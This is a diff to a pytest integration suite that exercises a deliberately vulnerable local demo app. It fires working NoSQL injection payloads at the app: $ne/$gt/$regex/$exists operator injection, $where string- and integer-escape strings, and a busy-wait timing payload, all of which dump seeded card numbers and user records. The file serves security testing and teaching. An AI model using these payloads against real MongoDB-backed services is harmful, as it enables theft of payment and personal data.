@@ -1,33 +1,43 @@
 """Functional tests for the vulnerable NoSQL-injection demo app in ``vuln_apps``.
 
 These tests exercise an *already-running* Docker Compose stack that serves the
-vulnerable PHP app at ``http://localhost:8080`` (see
-``vuln_apps/docker-compose.yml``). They are integration tests: if the stack is not
-reachable, the whole module is skipped.
+vulnerable Flask app at ``http://localhost:8080`` (see
+``vuln_apps/docker-compose.yml``). They are integration tests: if the stack is
+not reachable, the whole module is skipped.
 
-The app exposes three endpoints, each with a NoSQL injection flaw:
+The app exposes four injection endpoints, each with a different NoSQL injection
+flaw:
 
-* ``/acct.php?acctid=...``
-    Operator injection -- ``?acctid[$ne]=`` turns the lookup filter into
+* ``/acct?account_id=...``
+    Operator injection -- ``?account_id[$ne]=`` turns the lookup filter into
     ``{"id": {"$ne": ""}}`` and dumps every payment record (card numbers + CVV).
-* ``/userdata.php?usersearch=...``
-    ``$where`` JavaScript injection -- a crafted payload forces the ``$where``
-    function to return ``true`` for every document.
-* ``/orderdata.php?ordersearch=...``
-    ``$where`` JavaScript injection (same technique, different collection).
+* ``/userdata?name=...``
+    ``$where`` JavaScript string-escape injection (quoted context) -- a crafted
+    payload breaks out of the string literal and forces the ``$where`` function
+    to return ``true`` for every document.
+* ``/orderdata?order=...``
+    ``$where`` JavaScript string-escape injection (same technique, different
+    collection).
+* ``/numericdata?order=...``
+    ``$where`` JavaScript integer-escape injection (numeric context, no quotes)
+    -- a crafted payload injects JS without needing to break out of quotes.
+    This endpoint also supports timing-based injection (a sleep loop in the
+    ``$where`` function delays the response).
 
-Each endpoint is tested twice: a *baseline* (a normal single-record lookup) and an
-*injection* (a crafted payload that dumps the whole collection). The injection
-tests assert that the full collection is returned, demonstrating the vulnerability.
+Each endpoint is tested with a *baseline* (a normal single-record lookup) and an
+*injection* (a crafted payload that dumps the whole collection or causes a
+delay). The injection tests assert the full collection is returned or the
+response is delayed, demonstrating the vulnerability.
 
 Start the stack first, then run:
 
-    cd vuln_apps && docker compose up -d
+    cd vuln_apps && docker compose up -d --build
     pytest tests/test_vuln_app.py -v
 """
 
 import os
 import re
+import time
 
 import pytest
 import requests
@@ -35,7 +45,7 @@ import requests
 # Base URL of the running compose stack. Override with NOSQLMAP_APP_URL if the
 # stack is served somewhere else.
 BASE_URL = os.environ.get("NOSQLMAP_APP_URL", "http://localhost:8080").rstrip("/")
-TIMEOUT = 10
+TIMEOUT = 30
 
 # --- Expected seed data (from vuln_apps/docker/mongo/mongo.nosql) -------------
 # paymentinfo: (name, id, card_number, cvv2)
@@ -66,11 +76,23 @@ ORDERS = [
     ("0", "Nobody", "Nothing", "0"),
 ]
 
-# Injection payload for the $where JavaScript endpoints. It breaks out of the
-# string literal and forces the $where function to return true for every document.
-# It deliberately does NOT use a // comment: the template's closing brace is the
-# last character, so a line comment would swallow it and break the function body.
-WHERE_INJECTION = "' ; return true; '"
+# Injection payload for the $where string-escape endpoints (quoted context).
+# It breaks out of the string literal and forces the $where function to return
+# true for every document.
+WHERE_STRING_INJECTION = "' ; return true; '"
+
+# Injection payload for the $where integer-escape endpoint (numeric context).
+# It injects JS directly without breaking out of quotes.
+WHERE_INTEGER_INJECTION = "1; return true;"
+
+# Timing payload: sleeps ~2 seconds per document via a busy-wait loop in the
+# $where function. With 6 seeded documents the total delay is ~12 seconds.
+WHERE_TIMING_PAYLOAD = (
+    "1; var date = new Date(); var curDate = null; "
+    "do { curDate = new Date(); } "
+    "while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 2); "
+    "return true;"
+)
 
 
 def _strip_html(html):
@@ -95,75 +117,123 @@ def _count(text, marker):
 def app():
     """Skip the whole module if the compose stack is not reachable."""
     try:
-        requests.get(BASE_URL + "/index.html", timeout=TIMEOUT)
+        requests.get(BASE_URL + "/", timeout=TIMEOUT)
     except requests.exceptions.RequestException as exc:
         pytest.skip(
             "vulnerable app not reachable at %s (%s). Start the stack first: "
-            "cd vuln_apps && docker compose up -d" % (BASE_URL, type(exc).__name__)
+            "cd vuln_apps && docker compose up -d --build" % (BASE_URL, type(exc).__name__)
         )
     return BASE_URL
 
 
 # --- Index page ----------------------------------------------------------------
 def test_index_page_loads(app):
-    """The landing page is served and links to the vulnerable form."""
-    html = requests.get(app + "/index.html", timeout=TIMEOUT).text
+    """The landing page is served and links to the vulnerable forms."""
+    html = requests.get(app + "/", timeout=TIMEOUT).text
     assert "Customer Information" in html
-    assert "acct.php" in html
+    assert "acct" in html
+    assert "numericdata" in html
 
 
-# --- acct.php: operator injection ----------------------------------------------
+# --- /acct: operator injection -------------------------------------------------
 def test_acct_baseline_single_record(app):
     """A normal lookup by customer ID returns exactly that customer's card."""
-    text = _get("/acct.php", {"acctid": "42"})
+    text = _get("/acct", {"account_id": "42"})
     # Adrien's card is returned...
     assert "5555123456789999" in text
     # ...and only one record is found.
     assert _count(text, "Card Number:") == 1
 
 
-def test_acct_injection_dumps_all_cards(app):
-    """``?acctid[$ne]=`` injects a $ne operator and dumps every payment record."""
-    text = _get("/acct.php", {"acctid[$ne]": ""})
-    # The injection returns the whole collection (more than the baseline's 1).
+def test_acct_injection_ne_dumps_all_cards(app):
+    """``?account_id[$ne]=`` injects a $ne operator and dumps every payment record."""
+    text = _get("/acct", {"account_id[$ne]": ""})
     assert _count(text, "Card Number:") == len(PAYMENTS)
-    # Every seeded card number is exposed.
     for _name, _id, card, _cvv in PAYMENTS:
         assert card in text
 
 
-# --- userdata.php: $where JavaScript injection ---------------------------------
+def test_acct_injection_gt_dumps_all_cards(app):
+    """``?account_id[$gt]=`` injects a $gt operator and dumps every payment record."""
+    text = _get("/acct", {"account_id[$gt]": ""})
+    assert _count(text, "Card Number:") == len(PAYMENTS)
+    for _name, _id, card, _cvv in PAYMENTS:
+        assert card in text
+
+
+def test_acct_injection_regex_dumps_all_cards(app):
+    """``?account_id[$regex]=`` injects a $regex operator and dumps every payment record."""
+    text = _get("/acct", {"account_id[$regex]": ""})
+    assert _count(text, "Card Number:") == len(PAYMENTS)
+    for _name, _id, card, _cvv in PAYMENTS:
+        assert card in text
+
+
+def test_acct_injection_exists_dumps_all_cards(app):
+    """``?account_id[$exists]=`` injects a $exists operator and dumps every payment record."""
+    text = _get("/acct", {"account_id[$exists]": ""})
+    assert _count(text, "Card Number:") == len(PAYMENTS)
+    for _name, _id, card, _cvv in PAYMENTS:
+        assert card in text
+
+
+# --- /userdata: $where string-escape injection ---------------------------------
 def test_user_baseline_returns_matches(app):
-    """A normal username search returns only the matching user(s)."""
-    text = _get("/userdata.php", {"usersearch": "adrien"})
+    """A normal name search returns only the matching user(s)."""
+    text = _get("/userdata", {"name": "adrien"})
     # Two seeded users share the username "adrien".
     assert _count(text, "Username:") == 2
     assert "adrien@sec642.org" in text
 
 
 def test_user_injection_dumps_all_users(app):
-    """A $where payload that returns true dumps the entire users collection."""
-    text = _get("/userdata.php", {"usersearch": WHERE_INJECTION})
-    # The injection returns every user (more than the baseline's 2).
+    """A $where string-escape payload dumps the entire users collection."""
+    text = _get("/userdata", {"name": WHERE_STRING_INJECTION})
     assert _count(text, "Username:") == len(USERS)
-    # Every seeded email is exposed.
     for _name, _username, email in USERS:
         assert email in text
 
 
-# --- orderdata.php: $where JavaScript injection --------------------------------
+# --- /orderdata: $where string-escape injection --------------------------------
 def test_order_baseline_single_record(app):
     """A normal order lookup by ID returns exactly that order."""
-    text = _get("/orderdata.php", {"ordersearch": "42"})
+    text = _get("/orderdata", {"order": "42"})
     assert "Fuzzy pink towel" in text
     assert _count(text, "Order ID:") == 1
 
 
 def test_order_injection_dumps_all_orders(app):
-    """A $where payload that returns true dumps the entire orders collection."""
-    text = _get("/orderdata.php", {"ordersearch": WHERE_INJECTION})
-    # The injection returns every order (more than the baseline's 1).
+    """A $where string-escape payload dumps the entire orders collection."""
+    text = _get("/orderdata", {"order": WHERE_STRING_INJECTION})
     assert _count(text, "Order ID:") == len(ORDERS)
-    # Every seeded order item is exposed.
     for _id, _name, item, _qty in ORDERS:
         assert item in text
+
+
+# --- /numericdata: $where integer-escape injection -----------------------------
+def test_numeric_baseline_single_record(app):
+    """A normal numeric lookup by order ID returns exactly that order."""
+    text = _get("/numericdata", {"order": "42"})
+    assert "Fuzzy pink towel" in text
+    assert _count(text, "Order ID:") == 1
+
+
+def test_numeric_injection_dumps_all_orders(app):
+    """A $where integer-escape payload (no quotes) dumps the entire orders collection."""
+    text = _get("/numericdata", {"order": WHERE_INTEGER_INJECTION})
+    assert _count(text, "Order ID:") == len(ORDERS)
+    for _id, _name, item, _qty in ORDERS:
+        assert item in text
+
+
+# --- /numericdata: timing-based injection --------------------------------------
+def test_numeric_timing_delays_response(app):
+    """A $where timing payload (sleep loop) delays the response by several seconds."""
+    start = time.monotonic()
+    text = _get("/numericdata", {"order": WHERE_TIMING_PAYLOAD})
+    elapsed = time.monotonic() - start
+    # The sleep loop runs per document (6 docs x ~2s = ~12s total).
+    # Assert a significant delay (well above a normal <1s response).
+    assert elapsed > 5, f"Expected a timing delay > 5s, got {elapsed:.1f}s"
+    # The injection also dumps all records (the payload returns true for every doc).
+    assert _count(text, "Order ID:") == len(ORDERS)
